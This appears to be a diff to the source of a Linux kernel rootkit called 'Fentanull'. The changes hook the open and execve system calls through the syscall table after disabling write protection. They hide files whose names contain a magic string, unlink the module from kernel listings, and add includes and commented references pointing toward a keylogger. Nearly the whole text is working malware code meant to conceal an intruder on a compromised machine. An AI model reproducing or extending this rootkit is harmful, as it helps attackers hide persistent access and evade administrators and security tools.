@@ -1,3 +1,4 @@
+
 #include <linux/module.h>
 #include <linux/init.h>
 #include <linux/sched.h>
@@ -11,8 +12,11 @@
 #include <linux/string.h>
 #include <linux/slab.h>
 #include <linux/proc_fs.h>
+#include <linux/keyboard.h>
+#include <linux/notifier.h>
 #include "consts.h" 
-
+/*#include "utils/keylogger.c"
+/*#include "utils/magic.c"*/
 MODULE_AUTHOR("cow");
 MODULE_LICENSE("GPL");
 
@@ -20,11 +24,17 @@ asmlinkage int (*old_open)(const char *pathname, int flags, mode_t mode);
 asmlinkage int (*old_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 asmlinkage int (*old_getdents64)(unsigned int fd, struct linux_dirent *dirp, unsigned int count); 
 asmlinkage int (*old_execve)(const char *filename, char *const argv[], char *const envp[]);
+asmlinkage int (*old_kill)(pid_t pid, int sig); 
+
+struct fentanull_info 
+{ 
+	int mod;  
+	int files; 
+};
 
 static unsigned long *sys_call_table; 
 pte_t *pte; 
-static short mod_status = 0;
-struct task_struct *kthread; 
+struct fentanull_info hidden; 
 
 
 inline void custom_write_cr0(unsigned long cr0)
@@ -42,7 +52,7 @@ static inline void cr0_enable(int mode)
 			custom_write_cr0(cr0 & (~0x00010000));
 			#ifdef DEBUG
 			printk(KERN_ALERT "[-] rk[cr0]: enabled!\n"); 
-			#endif DEBUG	
+			#endif 	
 			break;
 		}
 		case 0: 
@@ -65,34 +75,63 @@ void mod_hide(void)
 	kobject_del(&THIS_MODULE->mkobj.kobj); 
 	THIS_MODULE->sect_attrs = NULL; 
 	THIS_MODULE->notes_attrs = NULL; 
-	/* might add ->name stuff here */
+	hidden.mod = 1; 
 }
+
+/*========== EXECVE ============ */
 
 asmlinkage int fentanull_execve(const char *filename, char *const argv[], char *const envp[])
 { 
 	#ifdef DEBUG
 	printk(KERN_ALERT "[-] rk: execve hooked\n");
 	#endif 
-	return fentanull_execve(filename, argv, envp);
+	if ((hidden.mod & hidden.files) == 1)
+		return old_execve(filename, argv, envp);
+	else 
+	{
+		char *kfilename; 
+		kfilename = (char *)kmalloc(256, GFP_KERNEL); 
+		raw_copy_from_user(kfilename, filename, 255); 
+		if (strstr(kfilename, MAGICSTR)!=NULL)
+		{ 
+			#ifdef DEBUG 
+			printk(KERN_ALERT "[-] rk: hiding file"); 
+			#endif 
+			return -ENOENT; 
+		}
+		else 
+		{
+			kfree(kfilename);
+			return old_execve(filename, argv, envp);
+		}
+	}
 } 
+
+/*========== OPEN ============ */
 
 asmlinkage int fentanull_open(const char *pathname, int flags, mode_t mode)
 { 
 	#ifdef DEBUG 
 	printk(KERN_ALERT "[-] rk: open called\n"); 
 	#endif
-	char *kpathname; 
-	kpathname = (char *)kmalloc(256, GFP_KERNEL);
-	raw_copy_from_user(kpathname, pathname, 255);
-	if (strstr(kpathname, MAGICSTR)!=NULL)
-	{
-		return -ENOENT;
-	}
-	else
-	{
-		/* kfree() the pathname */
-		kfree(kpathname);
-		return old_open(pathname, flags, mode);
+	if ((hidden.mod & hidden.files) == 1)
+		return old_open(pathname, flags, mode); 
+	else {
+		char *kpathname; 
+		kpathname = (char *)kmalloc(256, GFP_KERNEL);
+		raw_copy_from_user(kpathname, pathname, 255);
+		if (strstr(kpathname, MAGICSTR)!=NULL)
+		{
+			#ifdef DEBUG 
+			printk(KERN_ALERT "[-] rk: hiding file\n");
+			#endif
+			return -ENOENT;
+		}
+		else
+		{
+			kfree(kpathname);
+			return old_open(pathname, flags, mode);
+		}
 	}
 }
 
@@ -186,12 +225,12 @@ void set_open(int hook, int method)
 		}
 	}
 }
-
 static int __init fentanull_init(void)
 { 
 	#ifdef DEBUG 
 	printk(KERN_ALERT "[-] rk: Fentanull initialized.\n");
 	#endif
+	memset(&hidden, 0x0, sizeof(hidden));
 	sys_call_table = (void *)kallsyms_lookup_name("sys_call_table"); 
 	if (sys_call_table == NULL)
 	{ 
@@ -202,7 +241,10 @@ static int __init fentanull_init(void)
 	}
 	else 
 	{
+		/* comment this out for debugging */ 
+		mod_hide();
 		set_open(1, 1);
+		/* set_execve(1, 1); */
 		return 0;	       
 	}
 }
@@ -214,6 +256,7 @@ static void __exit fentanull_exit(void)
 	printk(KERN_ALERT "[-] rk: Fentanull is exiting...\n"); 
 	#endif 
 	set_open(0, 1);
+	/* set_execve(0, 1); */
 } 
 
 module_init(fentanull_init);
